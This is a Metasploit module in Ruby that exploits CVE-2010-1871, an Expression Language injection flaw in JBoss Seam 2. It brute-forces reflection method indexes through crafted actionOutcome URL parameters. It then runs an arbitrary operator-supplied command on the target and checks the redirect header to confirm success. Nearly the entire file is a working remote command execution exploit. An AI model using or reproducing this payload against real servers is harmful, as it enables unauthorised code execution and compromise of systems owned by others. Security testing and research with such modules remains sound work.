##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'JBoss Seam 2 Remote Command Execution',
        'Description' => %q{
          JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
          4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
          Language (EL) expressions, which allows remote attackers to execute arbitrary code
          via a crafted URL. This modules also has been tested successfully against IBM
          WebSphere 6.1 running on iSeries.

          NOTE: this is only a vulnerability when the Java Security Manager is not properly
          configured.
        },
        'Author' => [
          'guerrino di massa', # Metasploit module
          'Cristiano Maruti <cmaruti[at]gmail.com>' # Support for IBM Websphere 6.1
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2010-1871'],
          ['OSVDB', '66881']
        ],
        'DisclosureDate' => '2010-07-19',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'Target URI', '/seam-booking/home.seam']),
        OptString.new('CMD', [ true, 'The command to execute.'])
      ]
    )
  end

  def run
    uri = normalize_uri(target_uri.to_s)
    cmd_enc = ''
    cmd_enc << Rex::Text.uri_encode(datastore['CMD'])

    flag_found_one = 255
    flag_found_two = 255

    uri_part_1 = "?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
    uri_part_2 = "].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
    uri_part_3 = "].invoke(null),'"

    25.times do |index|
      req = uri + uri_part_1 + index.to_s + ']}'

      res = send_request_cgi(
        {
          'uri' => req,
          'method' => 'GET'
        }, 20
      )

      if res && res.headers['Location'] =~ /java.lang.Runtime.exec%28java.lang.String%29/
        flag_found_one = index
        print_status('Found right index at [' + index.to_s + '] - exec')
      elsif res && res.headers['Location'] =~ /java.lang.Runtime\+java.lang.Runtime.getRuntime/
        print_status('Found right index at [' + index.to_s + '] - getRuntime')
        flag_found_two = index
      else
        print_status("Index [#{index}]")
      end
    end

    if flag_found_one != 255 && flag_found_two != 255
      print_status('Target appears VULNERABLE!')
      print_status('Sending remote command:' + datastore['CMD'])

      req = uri + uri_part_1 + flag_found_one.to_s + uri_part_2 + flag_found_two.to_s + uri_part_3 + cmd_enc + "')}"

      res = send_request_cgi(
        {
          'uri' => req,
          'method' => 'GET'
        }, 20
      )

      if res && res.headers['Location'] =~ /pwned=java.lang.UNIXProcess/
        print_good('Exploited successfully')
      else
        print_error('Exploit failed')
      end
    else
      print_error('Target appears not vulnerable!')
    end
  end
end
